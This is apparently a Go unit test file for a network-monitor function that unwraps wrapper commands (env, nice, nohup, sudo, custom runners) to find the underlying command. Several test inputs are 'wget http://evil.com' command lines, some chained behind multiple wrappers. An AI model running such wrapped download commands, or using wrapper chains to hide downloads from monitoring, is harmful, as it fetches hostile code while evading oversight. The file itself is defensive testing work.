package netmonitor

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestUnwrapTransparentCommand_NoUnwrap(t *testing.T) {
	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/git", []string{"git", "status"}, nil)
	assert.Equal(t, "/usr/bin/git", cmd)
	assert.Equal(t, []string{"git", "status"}, args)
	assert.Equal(t, 0, depth)
}

func TestUnwrapTransparentCommand_Env(t *testing.T) {
	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/env", []string{"env", "wget", "http://evil.com"}, nil)
	assert.Equal(t, "wget", cmd)
	assert.Equal(t, []string{"wget", "http://evil.com"}, args)
	assert.Equal(t, 1, depth)
}

func TestUnwrapTransparentCommand_EnvWithFlags(t *testing.T) {
	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/env", []string{"env", "-i", "FOO=bar", "wget", "http://evil.com"}, nil)
	assert.Equal(t, "wget", cmd)
	assert.Equal(t, []string{"wget", "http://evil.com"}, args)
	assert.Equal(t, 1, depth)
}

func TestUnwrapTransparentCommand_Nice(t *testing.T) {
	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/nice", []string{"nice", "-n", "10", "wget", "http://evil.com"}, nil)
	assert.Equal(t, "wget", cmd)
	assert.Equal(t, []string{"wget", "http://evil.com"}, args)
	assert.Equal(t, 1, depth)
}

func TestUnwrapTransparentCommand_Nohup(t *testing.T) {
	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/nohup", []string{"nohup", "wget", "http://evil.com"}, nil)
	assert.Equal(t, "wget", cmd)
	assert.Equal(t, []string{"wget", "http://evil.com"}, args)
	assert.Equal(t, 1, depth)
}

func TestUnwrapTransparentCommand_ChainedWrappers(t *testing.T) {
	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/sudo", []string{"sudo", "nice", "-n", "5", "env", "wget", "http://evil.com"}, nil)
	assert.Equal(t, "wget", cmd)
	assert.Equal(t, []string{"wget", "http://evil.com"}, args)
	assert.Equal(t, 3, depth)
}

func TestUnwrapTransparentCommand_NoPayload(t *testing.T) {
	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/env", []string{"env", "-i", "FOO=bar"}, nil)
	assert.Equal(t, "/usr/bin/env", cmd)
	assert.Equal(t, []string{"env", "-i", "FOO=bar"}, args)
	assert.Equal(t, 0, depth)
}

func TestUnwrapTransparentCommand_DepthLimit(t *testing.T) {
	cmd, _, depth := UnwrapTransparentCommand("/usr/bin/env",
		[]string{"env", "env", "env", "env", "env", "env", "wget"}, nil)
	require.LessOrEqual(t, depth, 5)
	_ = cmd
}

func TestUnwrapTransparentCommand_PolicyOverrideAdd(t *testing.T) {
	overrides := &TransparentOverrides{
		Add: []string{"myrunner"},
	}
	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/myrunner", []string{"myrunner", "wget", "http://evil.com"}, overrides)
	assert.Equal(t, "wget", cmd)
	assert.Equal(t, []string{"wget", "http://evil.com"}, args)
	assert.Equal(t, 1, depth)
}

func TestUnwrapTransparentCommand_PolicyOverrideRemove(t *testing.T) {
	overrides := &TransparentOverrides{
		Remove: []string{"sudo"},
	}
	cmd, args, depth := UnwrapTransparentCommand("/usr/bin/sudo", []string{"sudo", "wget"}, overrides)
	assert.Equal(t, "/usr/bin/sudo", cmd)
	assert.Equal(t, []string{"sudo", "wget"}, args)
	assert.Equal(t, 0, depth)
}

func TestIsTransparentCommand(t *testing.T) {
	tests := []struct {
		basename    string
		transparent bool
	}{
		{"env", true},
		{"nice", true},
		{"nohup", true},
		{"sudo", true},
		{"time", true},
		{"xargs", true},
		{"git", false},
		{"curl", false},
		{"wget", false},
	}
	for _, tt := range tests {
		t.Run(tt.basename, func(t *testing.T) {
			assert.Equal(t, tt.transparent, IsTransparentCommand(tt.basename, nil))
		})
	}
}
